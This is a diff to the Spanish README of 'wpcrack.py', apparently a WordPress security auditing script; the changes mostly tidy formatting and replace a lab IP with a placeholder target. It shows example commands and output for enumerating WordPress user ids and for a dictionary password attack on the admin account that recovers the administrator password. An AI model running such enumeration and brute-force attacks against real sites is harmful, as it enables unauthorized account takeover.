@@ -12,17 +12,15 @@ Script para auditar la seguridad de un wordpress. Funcionalidades actuales:
 </p>
 <p>
 Ejemplo de enumeración de usuarios con id menor o igual a 10 utilizando peticiones POST:
-<pre>
-$ python wpcrack.py --quiet --url http://target/ enumerate -m POST
+<pre>$ python wpcrack.py --quiet --url http://target/ enumerate -m POST
 [+] User found (uid: 4): theboss
 [+] User found (uid: 3): user2
 [+] User found (uid: 2): user1
-[+] User found (uid: 1): admin
-</pre>
+[+] User found (uid: 1): admin</pre>
 </p>
 Ejemplo de ataque de diccionario a la cuenta de admin mostrando también las peticiones erróneas:
-<pre>
-$ python wpcrack.py --url http://192.168.0.30/wordpress/ bruteforce -u admin -w dict.txt[-] The password '1234admin' doesn't match
+<pre>$ python wpcrack.py --url http://target/ bruteforce -u admin -w dict.txt
+[-] The password '1234admin' doesn't match
 [-] The password '1234password' doesn't match
 [-] The password 'password' doesn't match
 [-] The password 'pass1234' doesn't match
@@ -32,8 +30,7 @@ $ python wpcrack.py --url http://192.168.0.30/wordpress/ bruteforce -u admin -w 
 
 [+] Username: admin
 [+] Password: admin
-[+] Profile : administrator
-</pre>
+[+] Profile : administrator</pre>
 <p>
 </p>
 <p>Agradecimientos por sus sugerencias a J. M. Fernández, @TheXC3LL</p>
